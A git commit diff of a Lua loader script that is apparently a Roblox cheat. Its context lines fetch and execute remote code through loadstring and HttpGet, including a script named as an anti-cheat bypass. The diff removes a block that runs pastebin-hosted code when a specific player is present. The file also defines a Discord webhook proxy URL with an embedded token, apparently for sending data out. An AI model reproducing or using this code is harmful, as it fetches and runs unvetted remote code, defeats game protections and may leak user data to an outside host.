ba85d3005147350fb2d65626e003edccddd28fea
LeanClient <108145692+LeanClient@users.noreply.github.com>
2024-02-24 16:54:33 +0000

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -2,12 +2,6 @@ local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-I
 loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
 wait()
 
-	if game.Players:FindFirstChild("ProAIt5000") then
-		loadstring(game:HttpGet('https://pastebin.com/raw/CBZ1CZ9s'))()
-	else
-print("Stop")
-	end
-
 local url =
    "https://webhook.lewisakura.moe/api/webhooks/1210543735364919326/mu34L2DbCoSANFu5gHMm4UbKqXiiVWDWEsoN-ssq4CwSVBmDjN3SLiPshaPmtlbXnTcp" 
 local data = {
